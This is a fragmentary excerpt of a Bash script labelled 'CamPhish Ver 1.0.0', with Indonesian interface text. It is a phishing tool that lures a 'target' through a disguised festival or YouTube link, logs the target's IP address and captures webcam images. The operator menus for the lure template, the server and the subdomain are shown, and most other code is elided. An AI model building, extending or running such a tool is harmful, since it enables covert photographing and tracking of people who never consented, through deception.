...
printf " \e[1;93m CamPhish Ver 1.0.0 \e[0m \n"
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu target,\e[0m\e[1;77m Press Ctrl + C untuk exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target telah membuka Link! [~]\n"
catch_ip
rm -rf ip.txt
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Telah mengambil Gambar! [✓]\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Masukkan nama Festival: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Masukkan ID tontonan video YouTube: \e[0m' yt_video_ID
...
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Pilib salah satu list: [Contohnya: 1] \e[0m' option_server
...
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Gunakan subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
